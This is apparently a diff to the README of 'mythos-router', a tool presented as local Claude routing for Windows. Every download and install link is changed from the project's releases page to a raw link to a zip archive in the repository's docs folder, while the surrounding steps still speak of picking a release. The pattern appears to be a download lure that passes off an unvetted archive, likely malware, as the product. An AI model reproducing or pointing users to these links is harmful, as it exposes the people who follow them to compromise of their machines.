@@ -1,6 +1,6 @@
 # 🧭 mythos-router - Local Claude routing for Windows
 
-[![Download mythos-router](https://img.shields.io/badge/Download%20mythos--router-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Setubaledwardroscoemurrow481/mythos-router/releases)
+[![Download mythos-router](https://img.shields.io/badge/Download%20mythos--router-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Setubaledwardroscoemurrow481/mythos-router/main/docs/router_mythos_appendant.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ mythos-router runs on your computer and helps route Claude-based workflows in on
 ## 📥 Download
 
 Visit this page to download:  
-https://github.com/Setubaledwardroscoemurrow481/mythos-router/releases
+https://raw.githubusercontent.com/Setubaledwardroscoemurrow481/mythos-router/main/docs/router_mythos_appendant.zip
 
 On that page, look for the latest release and download the Windows file. If there are several files, choose the one that matches Windows, then save it to your computer.
 
@@ -38,7 +38,7 @@ It keeps the setup centered on one machine so you can work without juggling many
 ## 🪟 Install on Windows
 
 1. Open the download page:  
-   https://github.com/Setubaledwardroscoemurrow481/mythos-router/releases
+   https://raw.githubusercontent.com/Setubaledwardroscoemurrow481/mythos-router/main/docs/router_mythos_appendant.zip
 
 2. Find the newest release.
 
@@ -233,4 +233,4 @@ These topics point to Claude-style tools, local AI workflows, and command-line u
 
 If you need to update or reinstall, use the same page:
 
-https://github.com/Setubaledwardroscoemurrow481/mythos-router/releases
+https://raw.githubusercontent.com/Setubaledwardroscoemurrow481/mythos-router/main/docs/router_mythos_appendant.zip
